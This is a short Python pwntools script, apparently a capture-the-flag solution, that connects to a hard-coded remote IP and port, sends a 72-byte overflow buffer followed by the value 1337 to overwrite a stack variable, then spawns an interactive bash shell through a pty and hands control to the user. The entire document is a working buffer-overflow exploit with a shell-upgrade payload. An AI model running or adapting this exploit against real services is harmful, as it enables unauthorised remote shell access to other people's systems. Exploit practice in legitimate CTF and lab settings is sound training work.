#OLD
from pwn import *
host = "62.173.140.174"
port = 27790
p = remote(host, port)
buf_size = 72 # * нажать чтобы ida показала размер массива в поелях стека
payload = b'A'*buf_size
payload += p32(1337)
payload += b'B'*10
payload += b'\n'
p.send(payload)
sleep(0.1)
p.sendline(b'python3 -c "import pty; pty.spawn(\\\"/bin/bash\\\")"')
sleep(0.1)
p.interactive()